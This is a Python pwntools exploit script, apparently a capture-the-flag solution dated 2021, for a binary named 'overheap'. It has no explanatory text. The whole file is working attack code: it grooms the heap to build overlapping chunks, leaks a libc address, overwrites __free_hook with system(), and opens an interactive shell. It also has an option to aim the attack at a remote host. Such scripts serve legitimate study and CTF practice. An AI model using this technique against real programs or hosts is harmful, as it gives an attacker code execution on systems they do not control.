# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './overheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>' , num)

def add(size):
    cmd(1)
    sla('Size:',size)

def show(idx):
    cmd(2)
    sla('id:',idx)

def edit(idx , Content = '\n'):
    cmd(3)
    sla('id:',idx)
    sa('Content:',Content)

def delete(idx):
    cmd(4)
    sla('id:',idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x428)
    add(0x18)
    add(0x418)
    add(0x438) #
    add(0x18)
    add(0x428)
    add(0x18)

    delete(0)
    delete(3)
    delete(5)
    delete(2)

    add(0x438) # fake #0

    add(0x418) #2
    add(0x428) #3
    add(0x428) #5

    delete(5)
    delete(2)
    add(0x428) # fd #2
    add(0x418) #5

    delete(5)
    delete(3)
    
    add(0x4f8) # free 3
    add(0x428) # bk #5
    add(0x418) #7
    add(0x18)

    edit(5 )
    edit(2 , p64(0) + '\n')
    payload = flat(
        '\x00'*0x410 ,
        0 , 0x440 + 0x20 + 0x430 + 0x20,
    )
    edit(0 , payload [:-1] + '\n')
    edit(6 , flat(0 ,0 ,0x8b0) )
    delete(3)
    add(0x438)
    add(0x18)
    show(5)
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    add(0x18)
    delete(10)
    delete(9)
    edit(4 , p64(__free_hook - 8) + '\n')
    add(0x18)
    add(0x18)
    edit(10 , flat('/bin/sh\x00' , system_addr) + '\n')

    delete(10)
    # dbg()

    sl('echo shell')
    ru('shell')
    sl('echo GetShell')
    p.interactive()

attack()

'''
@File    :   overheap.py
@Time    :   2021/10/14 18:45:20
@Author  :   Niyah 
'''